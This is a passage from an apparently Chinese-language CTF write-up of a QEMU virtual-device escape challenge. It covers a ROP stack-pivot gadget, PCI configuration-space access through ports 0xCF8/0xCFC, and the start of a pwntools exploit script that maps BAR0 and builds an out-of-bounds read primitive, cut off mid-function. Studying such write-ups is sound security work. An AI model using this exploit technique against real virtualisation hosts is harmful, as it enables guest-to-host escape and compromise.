class="number">0x4b8</span>, payload=leak)</span><br></pre></td></tr></table></figure></div>

<p>或者借助栈迁移指令执行 ROP 进一步可以加载任意 shellcode 执行。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x00000000004dc19c : push rax ; pop rsp ; ret</span><br></pre></td></tr></table></figure></div>

<h2 id="完整-Exp-5"><a href="#完整-Exp-5" class="headerlink" title="完整 Exp"></a>完整 Exp</h2><blockquote>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 通过“PCI 配置机制 #1”访问配置空间</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pci_cfg_readl</span>(<span class="params">self, bus, dev, fn, off</span>):</span><br><span class="line"> cfg = <span class="number">0x80000000</span> | (bus&lt;&lt;<span class="number">16</span>) | (dev&lt;&lt;<span class="number">11</span>) | (fn&lt;&lt;<span class="number">8</span>) | (off &amp; <span class="number">0xfc</span>)</span><br><span class="line"> <span class="variable language_">self</span>.outl(<span class="number">0xcf8</span>, cfg)   <span class="comment"># 把要访问的 (bus,dev,fn,off) 选中</span></span><br><span class="line"> <span class="keyword">return</span> <span class="variable language_">self</span>.inl(<span class="number">0xcfc</span>)  <span class="comment"># 真正的数据在 0xCFC 端口读/写</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li><p><code>0xCF8</code> 是 <strong>CONFIG_ADDRESS</strong> 端口：写入 32 位“选择值”（最高位&#x3D;1 表示启用；后面编码 bus&#x2F;dev&#x2F;fn&#x2F;offset）。</p>
</li>
<li><p><code>0xCFC</code> 是 <strong>CONFIG_DATA</strong> 端口：紧接着对它 <code>inl/outl</code>，就能读&#x2F;写配置空间对应寄存器的 32 位数据。</p>
</li>
<li><p>这样你就能：</p>
<ul>
<li>读 <code>off=0x00</code> 拿到 <code>device_id:vendor_id</code>；</li>
<li>读&#x2F;写 <code>off=0x10</code>（BAR0），决定<strong>设备 MMIO 映射到物理地址的哪一段</strong>；</li>
<li>读&#x2F;写 <code>off=0x04</code>（COMMAND&#x2F;STATUS），设置 <strong>Memory Space Enable（bit1）</strong>、<strong>Bus Master Enable（bit2）</strong> 等。</li>
</ul>
</li>
</ul>
<p><strong>结论</strong>：只有<strong>把 BAR0 写到一个有效的物理地址</strong>，并且（通常）把 <strong>COMMAND.bit1（MEM）置 1</strong>，<code>BASE+offset</code> 的 <code>readq/writeq</code> 才会真正打到你的设备 <code>qwb_mmio_read/qwb_mmio_write</code>。</p>
<p>在 PC（i440FX）平台上，<strong>PCI MMIO 窗口</strong>常见在 3.5G–4G 附近（例如 <code>0xE0000000</code> 起）。题目里内存只有 <code>-m 512M</code>，所以设置 BAR0  为 <strong><code>0xF0000000</code> 远离 RAM，不冲突</strong>；</p>
</blockquote>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re, os, time, struct</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span> <span class="keyword">if</span> os.getenv(<span class="string">&#x27;DEBUG&#x27;</span>) <span class="keyword">else</span> <span class="string">&#x27;info&#x27;</span></span><br><span class="line">HEX = re.<span class="built_in">compile</span>(<span class="string">r&#x27;0x[0-9a-fA-F]+&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># -------------------- qtest wrapper --------------------</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">QTest</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, argv=[<span class="string">&quot;./launch.sh&quot;</span>], tmo=<span class="number">5.0</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.p = process(argv, shell=<span class="literal">False</span>)</span><br><span class="line">        <span class="variable language_">self</span>.tmo = <span class="built_in">float</span>(os.getenv(<span class="string">&#x27;QTEST_TMO&#x27;</span>, tmo))</span><br><span class="line">        <span class="variable language_">self</span>._drain_banner()</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_strip_prefix</span>(<span class="params">line: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        s = line.decode(<span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;ignore&#x27;</span>).rstrip(<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> s.startswith(<span class="string">&#x27;[&#x27;</span>):</span><br><span class="line">            rb = s.find(<span class="string">&#x27;]&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> rb != -<span class="number">1</span>:</span><br><span class="line">                s = s[rb + <span class="number">1</span>:].lstrip()</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_drain_banner</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.p.timeout = <span class="number">0.1</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> <span class="variable language_">self</span>.p.recvline(timeout=<span class="number">0.1</span>):</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            <span class="variable language_">self</span>.p.timeout = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_flush_before_send</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.p.timeout = <span class="number">0.01</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                l = <span class="variable language_">self</span>.p.recvline(timeout=<span class="number">0.01</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> l: <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            <span class="variable language_">self</span>.p.timeout = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_send</span>(<span class="params">self, s: <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>._flush_before_send()</span><br><span class="line">        <span class="variable language_">self</span>.p.sendline(s.encode())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_read_resp</span>(<span class="params">self, need_val=<span class="literal">False</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        读到出现 OK 为止；兼容 &#x27;OK 0x...&#x27; 或 &#x27;0x...\\nOK&#x27;。</span></span><br><span class="line"><span class="string">        返回最后一个十六进制数（need_val=True）或 None。</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        val = <span class="literal">None</span></span><br><span class="line">        deadline = time.time() + <span class="variable language_">self</span>.tmo</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">if</span> time.time() &gt; deadline:</span><br><span class="line">                <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;No reply from qtest&quot;</span>)</span><br><span class="line">            l = <span class="variable language_">self</span>.p.recvline()</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> l: <span class="keyword">continue</span></span><br><span class="line">            s = <span class="variable language_">self</span>._strip_prefix(l)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> s: <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;FAIL&#x27;</span> <span class="keyword">in</span> s:</span><br><span class="line">                <span class="keyword">raise</span> RuntimeError(s)</span><br><span class="line">            <span class="keyword">if</span> need_val:</span><br><span class="line">                ms = HEX.findall(s)</span><br><span class="line">                <span class="keyword">if</span> ms: val = <span class="built_in">int</span>(ms[-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">            <span class="keyword">if</span> s == <span class="string">&#x27;OK&#x27;</span> <span class="keyword">or</span> s.startswith(<span class="string">&#x27;OK&#x27;</span>):</span><br><span class="line">                <span class="variable language_">self</span>._flush_before_send()</span><br><span class="line">                <span class="keyword">return</span> val</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ---- qtest commands ----</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">writeq</span>(<span class="params">self, addr, val</span>):</span><br><span class="line">        <span class="variable language_">self</span>._send(<span class="string">f&quot;writeq <span class="subst">&#123;addr:#x&#125;</span> <span class="subst">&#123;val:#x&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>._read_resp(<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">readq</span>(<span class="params">self, addr</span>):</span><br><span class="line">        <span class="variable language_">self</span>._send(<span class="string">f&quot;readq <span class="subst">&#123;addr:#x&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>._read_resp(<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">outl</span>(<span class="params">self, port, val</span>):</span><br><span class="line">        <span class="variable language_">self</span>._send(<span class="string">f&quot;outl <span class="subst">&#123;port:#x&#125;</span> <span class="subst">&#123;val:#x&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>._read_resp(<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inl</span>(<span class="params">self, port</span>):</span><br><span class="line">        <span class="variable language_">self</span>._send(<span class="string">f&quot;inl <span class="subst">&#123;port:#x&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>._read_resp(<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ---- guest RAM helpers ----</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">mem_write</span>(<span class="params">self, addr, data: <span class="built_in">bytes</span></span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data), <span class="number">8</span>):</span><br><span class="line">            chunk = data[i:i + <span class="number">8</span>]</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(chunk) &lt; <span class="number">8</span>:</span><br><span class="line">                chunk += <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">8</span> - <span class="built_in">len</span>(chunk))</span><br><span class="line">            <span class="variable language_">self</span>.writeq(addr + i, struct.unpack(<span class="string">&#x27;&lt;Q&#x27;</span>, chunk)[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">mem_write_qword</span>(<span class="params">self, addr, qword</span>):</span><br><span class="line">        <span class="variable language_">self</span>.writeq(addr, qword)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">mem_read</span>(<span class="params">self, addr, size</span>):</span><br><span class="line">        out = <span class="built_in">bytearray</span>()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, size, <span class="number">8</span>):</span><br><span class="line">            out += struct.pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="variable language_">self</span>.readq(addr + i))</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>(out[:size])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ---- PCI config via CF8/CFC ----</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pci_cfg_readl</span>(<span class="params">self, bus, dev, fn, off</span>):</span><br><span class="line">        cfg = <span class="number">0x80000000</span> | (bus &lt;&lt; <span class="number">16</span>) | (dev &lt;&lt; <span class="number">11</span>) | (fn &lt;&lt; <span class="number">8</span>) | (off &amp; <span class="number">0xfc</span>)</span><br><span class="line">        <span class="variable language_">self</span>.outl(<span class="number">0xcf8</span>, cfg)</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.inl(<span class="number">0xcfc</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pci_cfg_writel</span>(<span class="params">self, bus, dev, fn, off, val</span>):</span><br><span class="line">        cfg = <span class="number">0x80000000</span> | (bus &lt;&lt; <span class="number">16</span>) | (dev &lt;&lt; <span class="number">11</span>) | (fn &lt;&lt; <span class="number">8</span>) | (off &amp; <span class="number">0xfc</span>)</span><br><span class="line">        <span class="variable language_">self</span>.outl(<span class="number">0xcf8</span>, cfg)</span><br><span class="line">        <span class="variable language_">self</span>.outl(<span class="number">0xcfc</span>, val)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_qwb</span>(<span class="params">self, ven=<span class="number">0x2021</span>, dev_id=<span class="number">0x0612</span></span>):</span><br><span class="line">        <span class="keyword">for</span> d <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">            <span class="keyword">for</span> f <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">                vdid = <span class="variable language_">self</span>.pci_cfg_readl(<span class="number">0</span>, d, f, <span class="number">0x00</span>)</span><br><span class="line">                <span class="keyword">if</span> vdid == ((dev_id &lt;&lt; <span class="number">16</span>) | ven):</span><br><span class="line">                    <span class="keyword">return</span> (<span class="number">0</span>, d, f)</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;qwb device not found on PCI 00:*.*&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_bar0</span>(<span class="params">self, bus, dev, fn</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.pci_cfg_readl(bus, dev, fn, <span class="number">0x10</span>) &amp; ~<span class="number">0xF</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">set_bar0</span>(<span class="params">self, bus, dev, fn, base</span>):</span><br><span class="line">        <span class="variable language_">self</span>.pci_cfg_writel(bus, dev, fn, <span class="number">0x10</span>, base)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">enable_cmd_mem_busmaster</span>(<span class="params">self, bus, dev, fn</span>):</span><br><span class="line">        v = <span class="variable language_">self</span>.pci_cfg_readl(bus, dev, fn, <span class="number">0x04</span>)  <span class="comment"># COMMAND/STATUS dword</span></span><br><span class="line">        cmd = (v &amp; <span class="number">0xFFFF</span>) | <span class="number">0x0006</span>  <span class="comment"># bit1=MEM, bit2=BUSMASTER</span></span><br><span class="line">        v = (v &amp; ~<span class="number">0xFFFF</span>) | cmd</span><br><span class="line">        <span class="variable language_">self</span>.pci_cfg_writel(bus, dev, fn, <span class="number">0x04</span>, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># -------------------- exploit wrapper (wrap-around bug) --------------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">u64_neg</span>(<span class="params">off</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;把正的偏移 k 变成 2^64 - k（等价于 -k 的无符号表示）&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> ((<span class="number">1</span> &lt;&lt; <span class="number">64</span>) - (off &amp; ((<span class="number">1</span> &lt;&lt; <span class="number">64</span>) - <span class="number">1</span>))) &amp; ((<span class="number">1</span> &lt;&lt; <span class="number">64</span>) - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">QWB</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, qt: QTest, base=<span class="literal">None</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.qt = qt</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 1) 找到设备</span></span><br><span class="line">        bus, dev, fn = qt.find_qwb()</span><br><span class="line">        log.info(<span class="string">f&quot;Found qwb at 00:<span class="subst">&#123;dev:02x&#125;</span>.<span class="subst">&#123;fn&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 2) 配置 BAR0：若为 0，则手动映射到 MAP_BASE；并开启 MEM/BUSMASTER</span></span><br><span class="line">        bar0 = qt.get_bar0(bus, dev, fn)</span><br><span class="line">        <span class="keyword">if</span> bar0 == <span class="number">0</span>:</span><br><span class="line">            map_base = <span class="built_in">int</span>(os.getenv(<span class="string">&quot;MAP_BASE&quot;</span>, <span class="string">&quot;0xf0000000&quot;</span>), <span class="number">16</span>)</span><br><span class="line">            log.warning(<span class="string">f&quot;BAR0=0, programming BAR0 -&gt; <span class="subst">&#123;map_base:#x&#125;</span>&quot;</span>)</span><br><span class="line">            qt.set_bar0(bus, dev, fn, map_base)</span><br><span class="line">            qt.enable_cmd_mem_busmaster(bus, dev, fn)</span><br><span class="line">            bar0 = qt.get_bar0(bus, dev, fn)</span><br><span class="line">            <span class="keyword">if</span> bar0 == <span class="number">0</span>:</span><br><span class="line">                log.warning(<span class="string">&quot;BAR0 readback still 0; using MAP_BASE as BASE anyway (qtest 有时不会回写).&quot;</span>)</span><br><span class="line">                bar0 = map_base</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            qt.enable_cmd_mem_busmaster(bus, dev, fn)</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.BASE = bar0</span><br><span class="line">        log.success(<span class="string">f&quot;BAR0 = <span class="subst">&#123;self.BASE:#x&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 寄存器地址</span></span><br><span class="line">        <span class="variable language_">self</span>.REG_SIZE = <span class="variable language_">self</span>.BASE + <span class="number">0x00</span></span><br><span class="line">        <span class="variable language_">self</span>.REG_IDX = <span class="variable language_">self</span>.BASE + <span class="number">0x08</span></span><br><span class="line">        <span class="variable language_">self</span>.REG_SRC = <span class="variable language_">self</span>.BASE + <span class="number">0x10</span></span><br><span class="line">        <span class="variable language_">self</span>.REG_DST = <span class="variable language_">self</span>.BASE + <span class="number">0x18</span></span><br><span class="line">        <span class="variable language_">self</span>.REG_CNT = <span class="variable language_">self</span>.BASE + <span class="number">0x20</span></span><br><span class="line">        <span class="variable language_">self</span>.REG_CMD = <span class="variable language_">self</span>.BASE + <span class="number">0x28</span></span><br><span class="line">        <span class="variable language_">self</span>.REG_KICK = <span class="variable language_">self</span>.BASE + <span class="number">0x30</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 3) MMIO 烟雾测试：readq(KICK) 应返回 1</span></span><br><span class="line">        v = <span class="variable language_">self</span>.go()</span><br><span class="line">        <span class="keyword">if</span> v != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;MMIO not mapped? readq(BASE+0x30) -&gt; <span class="subst">&#123;v:#x&#125;</span>, expect 1&quot;</span>)</span><br><span class="line"></span><br><span class="line">        log.info(<span class="string">f&quot;SIZE(initial) = <span class="subst">&#123;self.get_size()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># MMIO regs</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">set_size</span>(<span class="params">self, n</span>):</span><br><span class="line">        <span class="variable language_">self</span>.qt.writeq(<span class="variable language_">self</span>.REG_SIZE, n)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_size</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.qt.readq(<span class="variable language_">self</span>.REG_SIZE)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">set_idx</span>(<span class="params">self, i</span>):</span><br><span class="line">        <span class="variable language_">self</span>.qt.writeq(<span class="variable language_">self</span>.REG_IDX, i)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wr_desc</span>(<span class="params">self, i, src=<span class="literal">None</span>, dst=<span class="literal">None</span>, cnt=<span class="literal">None</span>, cmd=<span class="literal">None</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.set_idx(i)</span><br><span class="line">        <span class="keyword">if</span> src <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>: <span class="variable language_">self</span>.qt.writeq(<span class="variable language_">self</span>.REG_SRC, src)</span><br><span class="line">        <span class="keyword">if</span> dst <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>: <span class="variable language_">self</span>.qt.writeq(<span class="variable language_">self</span>.REG_DST, dst)</span><br><span class="line">        <span class="keyword">if</span> cnt <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>: <span class="variable language_">self</span>.qt.writeq(<span class="variable language_">self</span>.REG_CNT, cnt)</span><br><span class="line">        <span class="keyword">if</span> cmd <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>: <span class="variable language_">self</span>.qt.writeq(<span class="variable language_">self</span>.REG_CMD, cmd &amp; <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">go</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.qt.readq(<span class="variable language_">self</span>.REG_KICK)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ---------- Wrap-around OOB ----------</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">oob_read_before</span>(<span class="params">self, neg_off, nbytes, 